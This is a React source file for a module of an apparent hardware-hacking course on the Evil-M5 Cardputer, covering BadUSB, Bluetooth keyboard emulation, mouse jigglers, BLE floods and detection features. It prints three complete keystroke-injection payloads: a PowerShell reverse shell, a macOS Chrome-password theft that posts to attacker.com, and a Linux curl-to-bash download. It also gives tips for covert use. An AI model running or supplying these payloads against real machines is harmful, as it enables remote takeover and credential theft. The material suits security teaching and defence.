import { ModuleHeader, SectionH, SubH, Callout, Code, SpecTable, Divider, Steps } from '../components/UI'

export default function ModuleBluetoothUSB() {
  return (
    <div>
      <ModuleHeader
        num="07"
        title="Bluetooth & USB Attacks"
        subtitle="BadUSB keystroke injection, BLE advertising floods, Bluetooth HID emulation, Flipper/AirTag detection, and mouse jigglers — attacks at the physical interface layer."
      />

      <SectionH>BadUSB — USB HID Keystroke Injection</SectionH>
      <p style={{ color: 'var(--color-text-muted)', lineHeight: '1.8' }}>
        <strong style={{ color: 'var(--color-text)' }}>BadUSB</strong> exploits the fact that USB devices self-identify to
        the host computer. When a USB device reports itself as a <strong style={{ color: 'var(--color-amber)' }}>HID (Human Interface Device)</strong>
        — specifically a keyboard — the host operating system trusts it completely, regardless of what it physically looks like.
        There's no authentication layer between USB keyboard and OS.
      </p>

      <div className="p-4 rounded-lg my-5 font-mono text-xs" style={{ background: 'var(--color-surface)', border: '1px solid var(--color-border)', lineHeight: '2.2' }}>
        <div style={{ color: 'var(--color-text-faint)' }}>Normal flow:</div>
        <div>Human types on keyboard <span style={{ color: 'var(--color-steel)' }}>→</span> USB HID report <span style={{ color: 'var(--color-steel)' }}>→</span> OS interprets keystrokes</div>
        <div className="mt-2" style={{ color: 'var(--color-text-faint)' }}>BadUSB flow:</div>
        <div>Cardputer plugged in <span style={{ color: 'var(--color-red)' }}>→</span> Reports as USB keyboard <span style={{ color: 'var(--color-red)' }}>→</span> Injects keystrokes at <span style={{ color: 'var(--color-amber)' }}>1000 keys/sec</span></div>
        <div>→ Opens terminal <span style={{ color: 'var(--color-red)' }}>→</span> Executes payload <span style={{ color: 'var(--color-red)' }}>→</span> Downloads malware / creates backdoor</div>
      </div>

      <SubH>Why It's Effective</SubH>
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 my-4">
        {[
          { t: 'No driver required', d: 'HID keyboards are universally supported by all OSes — Windows, Linux, macOS, Android, iOS. No installation prompt.' },
          { t: 'Bypasses endpoint security', d: 'Keystrokes look like legitimate user input. Most AV/EDR tools have no concept of "malicious keyboard" because it\'s indistinguishable from a real keyboard at the OS level.' },
          { t: 'Extremely fast', d: 'A human types ~5 characters/second. BadUSB injects at 1000+ chars/sec. A full payload runs in under 5 seconds — faster than a user can react.' },
          { t: 'Works when locked... sometimes', d: 'Locked screen doesn\'t help if the payload triggers the login bypass or if pre-boot execution is possible. UAC prompts are the main defense on Windows.' },
        ].map(item => (
          <div key={item.t} className="p-3 rounded-lg" style={{ background: 'var(--color-surface)', border: '1px solid var(--color-border-subtle)' }}>
            <div className="text-xs font-bold mb-1" style={{ color: 'var(--color-amber)', fontFamily: 'var(--font-display)' }}>{item.t}</div>
            <div className="text-[11px]" style={{ color: 'var(--color-text-faint)', lineHeight: '1.6' }}>{item.d}</div>
          </div>
        ))}
      </div>

      <SubH>Ducky Script Payload Language</SubH>
      <p style={{ color: 'var(--color-text-muted)', lineHeight: '1.8' }}>
        Evil-M5Project uses the <strong style={{ color: 'var(--color-text)' }}>Rubber Ducky</strong> script format (.txt files on the SD card):
      </p>
      <Code label="BadUSB payload — Windows reverse shell">{`DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -nop -exec bypass
ENTER
DELAY 800
STRING $c = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);
ENTER
STRING $s = $c.GetStream(); [byte[]]$b = 0..65535|%{0};
ENTER
STRING while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
ENTER
STRING   $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
ENTER
STRING   $r = (iex $d 2>&1 | Out-String); $x = $r + 'PS> ';
ENTER
STRING   $e = ([text.encoding]::ASCII).GetBytes($x); $s.Write($e,0,$e.Length)
ENTER
STRING };
ENTER`}</Code>
      <Code label="BadUSB payload — macOS credential theft">{`DELAY 500
GUI SPACE
DELAY 400
STRING terminal
ENTER
DELAY 800
STRING security find-generic-password -ga "Chrome" | awk -F'"' '{print $4}' > /tmp/c.txt
ENTER
STRING curl -X POST https://attacker.com/log -d @/tmp/c.txt
ENTER
STRING rm /tmp/c.txt
ENTER`}</Code>
      <Code label="BadUSB payload — Linux persistence">{`DELAY 500
CTRL ALT t
DELAY 800
STRING curl -s http://192.168.1.100/payload.sh | bash &
ENTER
STRING disown
ENTER`}</Code>

      <SpecTable rows={[
        ['DELAY ms',     'Wait N milliseconds before next command'],
        ['STRING text',  'Type text character by character'],
        ['ENTER',        'Press Enter key'],
        ['GUI r',        'Windows key + R (Run dialog)'],
        ['CTRL ALT t',   'Terminal shortcut (Linux)'],
        ['GUI SPACE',    'Spotlight (macOS)'],
        ['ALT F2',       'Run dialog (Linux GNOME)'],
        ['F12',          'Browser dev tools'],
      ]} />

      <Callout kind="danger">
        <strong>Physical access requirement:</strong> BadUSB requires physical USB connection to the target. This is both its strength (no network needed) and its limitation (you must have physical access for at least 5–30 seconds). USB port locks, endpoint USB control (e.g., group policy blocking unknown USB HID devices), and screensavers with immediate lock are the main defenses.
      </Callout>

      <Divider />

      <SectionH>Bluetooth Keyboard Emulation</SectionH>
      <p style={{ color: 'var(--color-text-muted)', lineHeight: '1.8' }}>
        The <strong style={{ color: 'var(--color-text)' }}>Bluetooth Keyboard</strong> feature uses the ESP32-S3's Bluetooth Classic
        HID profile to appear as a Bluetooth keyboard to nearby devices. The attack vector:
      </p>
      <Steps steps={[
        { title: 'Cardputer becomes discoverable as Bluetooth keyboard', body: 'It advertises a device name like "Apple Wireless Keyboard" or "Microsoft Bluetooth Keyboard" to appear legitimate.' },
        { title: 'Target device pairs', body: 'If a user manually pairs (or a previously paired device auto-connects), the Cardputer gains HID keyboard access over Bluetooth.' },
        { title: 'Inject keystrokes', body: 'Same as BadUSB, but wirelessly. Range is ~10m. No physical access required once paired.' },
      ]} />
      <Callout kind="info">
        Unlike USB HID, Bluetooth HID requires explicit pairing (user must accept, or device must auto-connect to a remembered device). The attack surface is smaller than BadUSB. Most effective when combined with social engineering ("pair your keyboard to start the demo").
      </Callout>

      <Divider />

      <SectionH>Mouse Jiggler</SectionH>
      <p style={{ color: 'var(--color-text-muted)', lineHeight: '1.8' }}>
        The <strong style={{ color: 'var(--color-text)' }}>Mouse Jiggler</strong> emulates a USB mouse HID device and
        sends periodic tiny mouse movement events to the host. This prevents:
      </p>
      <div className="space-y-1 my-3">
        {[
          'Screen lock / screensaver activation',
          'Sleep mode triggering',
          'Idle detection by productivity monitoring software',
          'Session timeout in RDP/VPN connections',
        ].map((s, i) => (
          <div key={i} className="flex items-center gap-2 text-sm" style={{ color: 'var(--color-text-muted)' }}>
            <span style={{ color: 'var(--color-green)' }}>✓</span> {s}
          </div>
        ))}
      </div>
      <p style={{ color: 'var(--color-text-muted)', lineHeight: '1.8' }}>
        Practically: plug in the Cardputer to a target computer in meeting room / office context. The screen stays unlocked while the attacker performs other tasks. Can be combined with BadUSB payloads that run after the system has been idle (and thus more susceptible to unattended exploitation).
      </p>

      <Divider />

      <SectionH>BLE Name Flood</SectionH>
      <p style={{ color: 'var(--color-text-muted)', lineHeight: '1.8' }}>
        <strong style={{ color: 'var(--color-text)' }}>BLENameFlood</strong> rapidly cycles Bluetooth Low Energy advertising
        packets with different device names. Effects:
      </p>
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 my-4">
        {[
          { name: 'BLE scanner pollution', desc: 'Any Bluetooth scanner (phones, diagnostic tools) sees hundreds of fake BLE devices — similar to beacon spam for WiFi. Makes legitimate BLE devices hard to find.' },
          { name: 'BLE DoS (minor)', desc: 'BLE scanning is battery-intensive. Flooding causes nearby devices to wake their radios repeatedly, draining battery faster than normal.' },
          { name: 'Privacy research', desc: 'Demonstrates how easily BLE space can be polluted. Shows workshop participants how ubiquitous BLE advertising is — every AirPod, smartwatch, fitness tracker is constantly advertising.' },
          { name: 'Flipper-trolling', desc: 'Originally popularized by Flipper Zero spam features. iOS 17+ added protections against Bluetooth advertisement flooding (the "iPhone Bluetooth storm" vulnerability is patched).', },
        ].map(item => (
          <div key={item.name} className="p-3 rounded-lg" style={{ background: 'var(--color-surface)', border: '1px solid var(--color-border-subtle)' }}>
            <div className="text-xs font-bold mb-1" style={{ color: 'var(--color-violet)', fontFamily: 'var(--font-display)' }}>{item.name}</div>
            <div className="text-[11px]" style={{ color: 'var(--color-text-faint)', lineHeight: '1.6' }}>{item.desc}</div>
          </div>
        ))}
      </div>

      <Divider />

      <SectionH>Wall of Flipper / Wall of AirTag</SectionH>
      <p style={{ color: 'var(--color-text-muted)', lineHeight: '1.8' }}>
        These are <strong style={{ color: 'var(--color-text)' }}>detection / awareness</strong> features, not attack tools.
      </p>
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 my-4">
        <div className="p-4 rounded-lg" style={{ background: 'var(--color-surface)', border: '1px solid var(--color-steel)33' }}>
          <div className="text-sm font-bold mb-2" style={{ color: 'var(--color-steel)', fontFamily: 'var(--font-display)' }}>Wall Of Flipper</div>
          <div className="text-xs" style={{ color: 'var(--color-text-faint)', lineHeight: '1.6' }}>
            Scans for BLE advertising packets characteristic of Flipper Zero devices. Flipper devices have distinct BLE advertisement patterns that can be fingerprinted — allows detection of other pentesters/researchers nearby.
          </div>
        </div>
        <div className="p-4 rounded-lg" style={{ background: 'var(--color-surface)', border: '1px solid var(--color-amber)33' }}>
          <div className="text-sm font-bold mb-2" style={{ color: 'var(--color-amber)', fontFamily: 'var(--font-display)' }}>Wall Of AirTag</div>
          <div className="text-xs" style={{ color: 'var(--color-text-faint)', lineHeight: '1.6' }}>
            Detects Apple AirTag proximity advertisements (BLE). AirTags broadcast every 2 seconds with a rotating privacy MAC. This feature can detect AirTags that might be tracking you — useful for anti-surveillance awareness.
          </div>
        </div>
      </div>
      <Callout kind="info">
        <strong>Skimmer Detector</strong> (under Advanced) similarly uses BLE scanning to detect Bluetooth-enabled payment card skimmers — common in gas station pumps. These devices advertise via BLE with characteristic device names (HC-05, HC-06, "Bluetooth" etc.).
      </Callout>

      <Divider />

      <SectionH>Bluetooth Serial Control</SectionH>
      <p style={{ color: 'var(--color-text-muted)', lineHeight: '1.8' }}>
        <strong style={{ color: 'var(--color-text)' }}>Bluetooth Serial Control</strong> exposes the Cardputer's serial interface
        over a Bluetooth SPP (Serial Port Profile) connection. Connect from your phone or laptop using a BT serial terminal app
        to:
      </p>
      <div className="space-y-1 my-3">
        {[
          'Control the Cardputer remotely without USB cable',
          'View real-time output from attack modules',
          'Send commands (start/stop attacks, change targets)',
          'Useful for covert operations — device in bag, controlled from phone',
        ].map((s, i) => (
          <div key={i} className="flex items-center gap-2 text-sm" style={{ color: 'var(--color-text-muted)' }}>
            <span style={{ color: 'var(--color-amber)' }}>▸</span> {s}
          </div>
        ))}
      </div>

      <Divider />

      <SectionH>Slave Mode & ESP32 RIG</SectionH>
      <p style={{ color: 'var(--color-text-muted)', lineHeight: '1.8' }}>
        <strong style={{ color: 'var(--color-text)' }}>Slave Mode</strong> turns the Cardputer into a controllable node in
        a multi-device mesh. A <strong style={{ color: 'var(--color-text)' }}>RIG</strong> is a coordinated cluster of multiple
        ESP32 devices running Evil-M5, with one as master and the rest as slaves.
      </p>
      <div className="p-4 rounded-lg my-4 font-mono text-xs" style={{ background: 'var(--color-surface)', border: '1px solid var(--color-border)', lineHeight: '2' }}>
        <div style={{ color: 'var(--color-amber)' }}>Master (Cardputer with keyboard)</div>
        <div style={{ color: 'var(--color-text-faint)' }}>├── Slave 1 (ESP32 board) → Deauther on ch1</div>
        <div style={{ color: 'var(--color-text-faint)' }}>├── Slave 2 (ESP32 board) → Handshake sniff on ch6</div>
        <div style={{ color: 'var(--color-text-faint)' }}>└── Slave 3 (ESP32 board) → Evil twin on ch11</div>
        <div className="mt-1" style={{ color: 'var(--color-steel)' }}>Coordinate attacks across all 2.4 GHz channels simultaneously</div>
      </div>
      <p style={{ color: 'var(--color-text-muted)', lineHeight: '1.8' }}>
        A RIG overcomes the single-channel limitation of a single ESP32. By deploying multiple slaves, you can monitor
        all channels concurrently, simultaneously deauth targets on different channels, and run handshake captures in parallel.
        Cheap ESP32 boards cost ~$3–5 each.
      </p>
    </div>
  )
}
